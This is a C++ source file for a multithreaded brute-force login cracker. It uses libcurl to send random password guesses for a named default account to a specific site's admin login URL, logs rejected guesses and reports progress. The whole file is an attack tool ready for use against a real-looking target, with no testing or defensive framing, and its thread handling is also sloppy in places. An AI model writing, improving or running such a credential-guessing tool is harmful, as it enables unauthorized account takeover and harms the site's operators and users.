#define NOMINMAX
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <future>
#include <chrono>
#include <mutex>
#include <random>
#include <algorithm>
#include <iterator>
#include <set>
#define CURL_STATICLIB
#include <curl/curl.h>
#include <stdexcept>
#include <atomic>
#include <queue>
#define TBB_USE_DEBUG 0
#include <unordered_set>
#include <bitset>
#include <random>
#include <shared_mutex>
class ThreadPool {
public:
    ThreadPool(size_t numThreads);
    ~ThreadPool();

    void enqueue(std::function<void()> task);
    void clearQueuePeriodically(std::chrono::seconds interval);

private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;

    std::mutex queueMutex;
    std::condition_variable condition;
    std::atomic<bool> stop;
};


void ThreadPool::clearQueuePeriodically(std::chrono::seconds interval) {
    while (!stop) {
        std::this_thread::sleep_for(interval);
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            while (!tasks.empty()) {
                tasks.pop();
            }
        }
    }
}

ThreadPool::ThreadPool(size_t numThreads) : stop(false) {
    for (size_t i = 0; i < numThreads; ++i) {
        workers.emplace_back([this] {
            while (true) {
                std::function<void()> task;
                {
                    std::unique_lock<std::mutex> lock(this->queueMutex);
                    this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                    if (this->stop && this->tasks.empty())
                        return;
                    task = std::move(this->tasks.front());
                    this->tasks.pop();
                }
                task();
            }
            });
    }

    std::thread clearThread(&ThreadPool::clearQueuePeriodically, this, std::chrono::seconds(10));
    clearThread.detach();
}
void ThreadPool::enqueue(std::function<void()> task) {
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        tasks.push(std::move(task));
    }
    condition.notify_one();
}

ThreadPool::~ThreadPool() {
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        stop.store(true);
    }
    condition.notify_all();
    for (std::thread& worker : workers)
        worker.join();
}
// Global variables
bool found = false;
std::string found_pass = "";
std::string target = "Lesotomate";
std::string url = "https://loudbooru.com/user_admin/login";
int i = 0;
std::mutex mtx;
std::vector<std::string> passwords;
std::vector<std::string> bad_passwords;
std::mutex passwords_mutex;
std::shared_mutex s;

void write_line(const std::string& file_path, const std::string& line) {
    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };

    for (const auto& encoding : encodings) {
        try {
            std::ofstream file(file_path, std::ios_base::app);
            if (file.is_open()) {
                file << line << std::endl;
                break;
            }
        }
        catch (const std::exception& e) {
            std::cerr << "An error occurred: " << e.what() << std::endl;
            break;
        }
    }
}
void write_lines(const std::string& file_path, const std::vector<std::string>& lines) {
    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };

    std::ofstream file(file_path, std::ios_base::app);
    if (!file.is_open()) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return;
    }

    std::ios_base::sync_with_stdio(false);
    std::cin.tie(nullptr);

    std::vector<std::future<void>> futures;
    for (const auto& line : lines) {
        std::cout << line;

        bool success = false;
        for (const auto& encoding : encodings) {
            try {
                futures.emplace_back(std::async(std::launch::async, [&file, &line]() {
                    file << line << std::endl;
                    }));
                success = true;
                break;
            }
            catch (const std::exception& e) {
                std::cerr << "An error occurred: " << e.what() << std::endl;
                break;
            }
        }
        if (!success) {
            std::cerr << "Failed to write line: " << line << std::endl;
        }
    }

    for (auto& future : futures) {
        future.wait();
    }
}
std::vector<std::string> read_file(const std::string& file_path) {
    std::vector<std::string> lines;
    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };

    for (const auto& encoding : encodings) {
        try {
            std::ifstream file(file_path);
            if (file.is_open()) {
                std::string line;
                while (std::getline(file, line)) {
                    lines.push_back(line);
                }
                file.close();
                return lines;
            }
        }
        catch (const std::exception& e) {
            std::cerr << "An error occurred: " << e.what() << std::endl;
            return {};
        }
    }
    return {};
}
std::string generate_password() {
    static const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";
    static const int max_length = 21;
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, characters.size() - 1);

    mtx.lock();
    std::unordered_set<std::string> bad_passwords_set(bad_passwords.begin(), bad_passwords.end());
    std::unordered_set<std::string> passwords_set(passwords.begin(), passwords.end());


    std::string password_attempt;
    std::unordered_set<char> used;

    int length = dis(gen) % max_length + 1;
    for (int i = 0; i < length; ++i) {
        char ch;
        do {
            ch = characters[dis(gen)];
        } while (used.find(ch) != used.end());
        password_attempt.push_back(ch);
        used.insert(ch);
    }

    while (bad_passwords_set.find(password_attempt) != bad_passwords_set.end() ||
        passwords_set.find(password_attempt) != passwords_set.end()) {
        std::unordered_set<std::string> bad_passwords_set(bad_passwords.begin(), bad_passwords.end());
        std::unordered_set<std::string> passwords_set(passwords.begin(), passwords.end());
        password_attempt.clear();
        used.clear();
        int length = dis(gen) % max_length + 1;
        for (int i = 0; i < length; ++i) {
            char ch;
            do {
                ch = characters[dis(gen)];
            } while (used.find(ch) != used.end());
            password_attempt.push_back(ch);
            used.insert(ch);
        }
    }
    passwords.emplace_back(password_attempt);
    mtx.unlock();

    return password_attempt;
}




size_t discard_data_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
    return size * nmemb;
}



void advanced_cracking() {
    CURL* curl;
    CURLcode res;
    try {
        curl = curl_easy_init();
        if (curl) {
            std::string user = target;
            std::string password = generate_password();

            // obtain user data and url-encode it
            std::string url_user(curl_easy_escape(curl, user.c_str(), 0));
            std::string url_password(curl_easy_escape(curl, password.c_str(), 0));
            std::string data = "user=" + url_user + "&pass=" + url_password;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);

            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                throw std::runtime_error(curl_easy_strerror(res));
            }

            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            if (http_code >= 200 && http_code < 400) {

                std::cout << password;
                found_pass = password;
                found = true;
            }
            else {
                std::async(std::launch::async, write_line, "bad_passwords.txt", password);
            }

            i += 1;
            curl_easy_cleanup(curl);

        }
        else {
            throw std::runtime_error("Failed to initialize CURL");
        }
    }
    catch (const std::exception& e) {
       // std::cout << "Exception: " << e.what();
    }
}

void status_report() {
    auto start_time = std::chrono::high_resolution_clock::now();
    auto last_report_time = start_time;
    int attempts_since_last_report = 0;
    while (!found) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::lock_guard<std::mutex> lock(mtx);


        auto current_time = std::chrono::high_resolution_clock::now();
        auto elapsed_minutes = std::chrono::duration_cast<std::chrono::minutes>(current_time - last_report_time).count();

        if (elapsed_minutes >= 1) {
            auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
            std::cout << "Progress: Tried " << i << " attempts\n";
            std::cout << "Total " << bad_passwords.size() << " combinations.\n";
            std::cout << "Time taken: " << elapsed_time << " seconds" << std::endl;

            last_report_time = current_time;
            attempts_since_last_report = 0;
        }
    }
}


int main(int argc, char* argv[]) {
    std::thread status_thread(status_report);
    std::vector<std::thread> threads;
    std::lock_guard<std::mutex> guard(passwords_mutex);

    status_thread.detach();
    if (argv[1]) {
        target = argv[1];
    }
    else {
        std::cout << "you must input a target";
        return 0;
    }
    if (argv[2]) {
        url = argv[2];
    }
    else {
        std::cout << "you must input a url";
        return 0;
    }

    bad_passwords = read_file("bad_passwords.txt");



    std::cout << "Initiating bruteforce against " << target << " on " << url << "\n";
    ThreadPool pool(std::thread::hardware_concurrency());
    while (!found) {

        for (int i = 0; i < 50; ++i) {
            try {
                pool.enqueue(advanced_cracking);

            }
            catch (const std::exception& e) {

            }

        }
        passwords.clear();
    }

    std::cout << found_pass;
    std::cout << found << std::endl;

    return 0;
}
